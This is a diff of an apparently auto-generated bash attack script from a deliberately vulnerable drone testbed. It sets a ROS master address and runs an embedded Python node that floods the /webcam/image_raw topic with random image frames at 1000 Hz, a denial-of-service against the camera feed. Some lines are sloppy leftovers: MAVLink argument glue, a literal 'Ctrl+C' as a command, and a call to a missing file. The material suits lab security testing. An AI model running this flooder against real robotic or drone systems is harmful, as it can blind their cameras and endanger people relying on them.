@@ -1,62 +1,54 @@
 #!/usr/bin/env bash
+# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Camera-Feed-ROS-Topic-Flooding.md
+# Created: 2025-11-23 15:43:26
+# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
-# Camera feed ROS topic flooding (MTD-aware)
-
-# MTD_INTERFACE_START
-if [[ -z "${TARGET_IP:-}" ]]; then
-    echo "ERROR: TARGET_IP is not set." >&2
-    echo "Run via attack_orchestrator.py so MTD state can resolve the target." >&2
-    exit 1
-fi
-
-case "${TARGET_SERVICE:-ROS_MASTER}" in
-  ROS_MASTER)
-    TARGET_PORT="${TARGET_PORT:-11311}"
-    ;;
-  *)
-    TARGET_PORT="${TARGET_PORT:-11311}"
-    ;;
-esac
-
-echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-ROS_MASTER})"
-# MTD_INTERFACE_END
-
+# 기준 경로 (요구사항)
 export BASE="${BASE:-$PWD}"
-if [[ -f "$BASE/00_env.sh" ]]; then
-    . "$BASE/00_env.sh"
-else
-    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
-    mkdir -p "$(dirname "$DVD_LOG")"
-    log(){ echo "[$(date +%F_%T)] $*"; }
-    export -f log
+
+# 공통 로그 연결(선택사항) - 존재 시 로드
+if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
+  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
+  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
 fi
 
 log "[ATTACK] id=camera-feed-ros-topic-flooding src=Camera-Feed-ROS-Topic-Flooding.md"
+log "[BLOCK 1] type=shell"
+sudo docker pull ros:noetic-ros-base
 
-# ROS 마스터(TARGET_IP:TARGET_PORT)를 대상으로 /webcam/image_raw 토픽 플러딩
-export ROS_MASTER_URI="http://${TARGET_IP}:${TARGET_PORT}"
-export ROS_IP="${ROS_IP:-$(hostname -I | awk '{print $1}')}"
-# ROS 환경이 준비되어 있다면 사용, 아니면 그냥 진행
-if [[ -f "/opt/ros/noetic/setup.bash" ]]; then
-    # shellcheck disable=SC1091
-    source /opt/ros/noetic/setup.bash
-fi
+log "[BLOCK 2] type=shell"
+docker run -it --network=simulator --ip=10.13.0.10 --name ros_noetic_container ros:noetic-ros-base bash
 
-log "[BLOCK 1] type=python (ROS Image Flooder)"
-python3 - << 'PY'
+log "[BLOCK 3] type=shell"
+export ROS_MASTER_URI=http://10.13.0.5:11311
+export ROS_IP=10.13.0.10
+source /opt/ros/noetic/setup.bash
+
+log "[BLOCK 4] type=python"
+python3 - <<'PY'
+# --- argv glue for converter ---
+import os, sys, re
+if len(sys.argv) <= 1:
+    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
+    if ep.startswith('udp:'):
+        try:
+            _, rest = ep.split(':', 1)
+            ep = rest
+        except ValueError:
+            pass
+    # expect ip:port
+    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
+        sys.argv = [sys.argv[0], ep]
+#!/usr/bin/env python3
+
+import rospy
+from sensor_msgs.msg import Image
 import numpy as np
 
-try:
-    import rospy
-    from sensor_msgs.msg import Image
-except ImportError as e:
-    print(f"[ERROR] ROS Python packages not available: {e}")
-    raise SystemExit(1)
-
 def flood_topic():
-    rospy.init_node("image_flooder", anonymous=True)
-    pub = rospy.Publisher("/webcam/image_raw", Image, queue_size=10)
+    rospy.init_node('image_flooder', anonymous=True)
+    pub = rospy.Publisher('/webcam/image_raw', Image, queue_size=10)
     rate = rospy.Rate(1000)  # 1000 Hz flooding
 
     while not rospy.is_shutdown():
@@ -70,10 +62,16 @@ def flood_topic():
         pub.publish(img)
         rate.sleep()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     try:
-        print("[INFO] Starting ROS image flooder on /webcam/image_raw")
         flood_topic()
     except rospy.ROSInterruptException:
         pass
 PY
+
+log "[BLOCK 5] type=shell"
+python3 ros-topic-flood.py
+
+log "[BLOCK 6] type=shell"
+Ctrl+C
+
